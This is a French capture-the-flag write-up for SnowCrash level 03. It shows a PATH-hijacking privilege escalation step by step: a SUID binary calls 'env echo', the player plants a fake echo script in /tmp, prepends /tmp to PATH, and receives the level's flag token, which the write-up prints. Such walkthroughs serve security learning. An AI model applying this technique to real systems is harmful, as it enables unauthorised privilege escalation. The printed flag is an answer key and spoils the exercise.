# Level 03 - Solution

## Introduction
Ce niveau exploite une vulnérabilité de **PATH Hijacking** dans un binaire SUID qui appelle une commande système sans chemin absolu.

## Étape 1 : Découverte du binaire

On remarque un binaire `level03` à la racine du répertoire home :
```bash
level03@SnowCrash:~$ ls -la
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

## Étape 2 : Récupération du binaire

Utiliser `scp` pour transférer le binaire vers notre machine hôte :
```bash
scp -P 4242 level03@10.14.200.6:~/level03 ~/sgoinfre/snowcrash
```

## Étape 3 : Décompilation et analyse

Décompiler le binaire avec [Dogbolt](https://dogbolt.org)

### Code décompilé (extrait) :

```c
iVar1 = system("/usr/bin/env echo Exploit me");
```

### 🔍 Analyse de la vulnérabilité

Le binaire exécute la commande :
```bash
/usr/bin/env echo Exploit me
```


## Étape 4 : Exploitation - PATH Hijacking

### Créer un faux binaire `echo`

Créer un script `echo` dans `/tmp` qui appelle `getflag` :
```bash
level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo
```

### Rendre le script exécutable

```bash
level03@SnowCrash:~$ chmod +x /tmp/echo
```

### Modifier le PATH

Placer `/tmp` en premier dans le `PATH` pour que notre faux `echo` soit trouvé avant le vrai :
```bash
level03@SnowCrash:~$ export PATH=/tmp:$PATH
```

### Exécuter le binaire

```bash
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

## Résultat

**Flag** : `qi0maab88jeaj46qoumi7maus`
